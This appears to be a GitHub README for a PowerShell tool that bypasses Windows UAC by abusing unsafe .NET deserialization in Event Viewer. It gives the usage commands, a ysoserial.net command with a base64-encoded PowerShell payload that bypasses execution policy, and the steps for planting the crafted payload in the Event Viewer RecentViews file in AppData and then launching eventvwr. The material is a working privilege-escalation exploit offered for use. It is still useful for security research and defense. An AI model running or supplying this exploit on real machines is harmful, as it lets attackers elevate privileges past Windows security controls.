# EventViewer-UACBypass

- RCE through Unsafe .Net Deserialization in Windows Event Viewer which leads to UAC bypass.
- Full credits to [Orange Tsai](https://twitter.com/orange_8361)
---
### Usage
```ps1
PS C:\Windows\Tasks> Import-Module .\Invoke-EventViewer.ps1

PS C:\Windows\Tasks> Invoke-EventViewer 
[-] Usage: Invoke-EventViewer commandhere
Example: Invoke-EventViewer cmd.exe

PS C:\Windows\Tasks> Invoke-EventViewer cmd.exe
[+] Running
[1] Crafting Payload
[2] Writing Payload
[+] EventViewer Folder exists
[3] Finally, invoking eventvwr
```
---
### Working
i) First, the script adds commands to be run to the file `C:\Windows\Tasks\EventViewerRCE.ps1`
- `Stop-Process -name mmc*` : Is used to close Microsoft Management Console.
- After that the command to be executed is added.


ii) Then it crafts payload which runs `C:\Windows\Tasks\EventViewerRCE.ps1` script. The base64 payload was generated using [ysoserial.net](https://github.com/pwntester/ysoserial.net) :
```ps1
ysoserial.exe -o base64 -f BinaryFormatter -g DataSet -c "powershell.exe -nop -e UwBlAHQALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBTAGMAbwBwAGUAIABDAHUAcgByAGUAbgB0AFUAcwBlAHIAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXABFAHYAZQBuAHQAVgBpAGUAdwBlAHIAUgBDAEUALgBwAHMAMQA="
```
- The base64 output from ysoserial.net is decoded and stored in `C:\Windows\Tasks\p4yl0ad`
- The powershell encoded command decodes to :
```
Set-ExecutionPolicy Bypass -Scope CurrentUser; C:\Windows\Tasks\EventViewerRCE.ps1
```

iii) When `WriteFile` function is executed, it checks if the `Event Viewer` folder exists in AppData and it it doesn't then we create the folder. Finally storing our base64 decoded payload in `RecentViews` file under this folder.

iv) In the end, `eventvwr` is executed which then executes our payload.

---

### Reference
- https://twitter.com/orange_8361/status/1518970259868626944
